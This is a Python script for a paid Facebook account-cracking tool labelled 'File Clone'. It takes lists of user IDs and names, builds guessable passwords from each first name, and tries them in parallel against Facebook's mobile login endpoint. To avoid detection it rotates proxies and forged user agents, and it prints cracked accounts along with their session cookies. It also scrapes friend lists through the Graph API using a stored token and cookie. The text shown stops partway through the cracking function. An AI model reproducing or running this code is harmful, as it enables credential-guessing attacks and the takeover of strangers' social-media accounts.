ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.2.1289 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; VKY-AL00 Build/HUAWEIVKY-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.3.1144 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; ru-ru; Mi MIX 2S Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; MI 8 Lite Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Mi Note 3 Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; POCOPHONE F1 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; ONEPLUS A5000 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.0.6.986 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; OPPO PBEM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi Note 8T Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.14.0.1221 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 9; en-US; SM-A750FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.8.1210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 9; en-US; VKY-AL00 Build/HUAWEIVKY-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.4.1214 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 9; Nokia 3.1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 9; ru-ru; MI 8 UD Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",]
ua = ["Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",]
ua = ["Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.98 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 YaBrowser/20.8.3.115 Yo",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.13.1.18362; 10.0.0.0.18363.1082) AppleWebKit/537.36 (KHTML, like Gecko) C",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; rv:81.0) Gecko/20100101 Firefox/81.0",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",]

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSoHel')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

def back():
	login()
SoHel="SoHel"
imt="SETU"
ak="CLASS3-"

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])


pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def SoHelj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
	import getpass

attemps = 0

#----------------------------User-Pass-----------------------------#

while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: ')
    password = input(' \033[0;93mEnter Password: ')

    if username == 's' and password == 's':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
#------------------[ MAIN ]-----------------#

os.system('espeak -a 300 " Your,   Real,  Name,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  my,   Paid,  Tools,  I, am, SOHEL,  KING"')
os.system('xdg-open https://www.facebook.com/S0HEL.1492?mibextid=ZbWKwL')
def banner():
	os.system("clear")
	print (f"""
\33[1;96m

███████╗ ██████╗ ██╗  ██╗███████╗██╗      ██╗   ██╗ █████╗ ██╗   ██╗
██╔════╝██╔═══██╗██║  ██║██╔════╝██║      ██║   ██║██╔══██╗██║   ██║
███████╗██║   ██║███████║█████╗  ██║█████╗██║   ██║███████║██║   ██║
╚════██║██║   ██║██╔══██║██╔══╝  ██║╚════╝╚██╗ ██╔╝██╔══██║██║   ██║
███████║╚██████╔╝██║  ██║███████╗███████╗  ╚████╔╝ ██║  ██║╚██████╔╝
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ 
                                                                    
            

---------------------------------------------
 💔💔💔 WELCOME TO SOHEL KING TOOLS💔💔💔     
---------------------------------------------
╔══════════════════════════════════════════╗🖤
║Author     : SOHEL-VAU
║Facebook   : SoHel RaNa
║Page       : Not
║Tool       : File Clone(Paid)
║Version    : 1.0                    
╚══════════════════════════════════════════╝💔 """)
def login():
	#print(logo)
	banner()
	SoHelj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SoHelj('\033[0;97m===============================================')
	SoHel= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if SoHel in ['m']:
		public()
	elif SoHel in ['1']:
		crack_file()
	elif SoHel in ['i','0i']:
		result()
	elif SoHel in ['2','02']:
		os.system('xdg-open https://wa.me/+8801325584199')
	elif SoHel in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		
		back()
	if jum<1 or jum>100000000:
		
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	#print(logo)
	os.system('espeak -a 300 " your file name"')
	print('\033[1;32m[ Put File Example:  /sdcard/SoHel.txt  Etc...]')
	o = input('\x1b[1;97m [+] INPut FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
    #print(logo)
	print('\x1b[1;92m METHOD 1\n\x1b[1;97m [1] METHOD 1 ')
	os.system('espeak -a 300 "  method,  one"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;92m USER\033[1;91m :\033[1;96m "+NameX)
	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOOL - FILE CLONE")
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOOL -WORK -Bangladesh")
	SoHelj(f'\033[0;97m╔════════════════════════════════════╗')
	
						
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append('freefirelover')
					pwv.append('iloveyou')
					pwv.append('iloveyoujannat')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					pwv.append(frs+'#@')
					pwv.append(frs+'gamer')
					pwv.append(frs+'999')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append('freefirelover')
					pwv.append('iloveyou')
					pwv.append('iloveyoujannat')
					pwv.append(frs+'12')
					
					
					
				pool.submit(crack,idf,pwv)
	print('')
	SoHelj('╔════════════════════════════════════╗')
	SoHelj('CRACK ENDED .......... ')
	print(f'{h}[{h}💚{h}]{h} TOTAL OKS : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo}[SoHel-😇] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'p.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#SoHel-
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•SoHel-Cp] {idf} • {pw}')     
				os.system('espeak -a 300 " C,  P"')
			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#SoHel-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•SoHel-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
				os.system('espeak -a 300 " SoHel,  Ok,  id"')
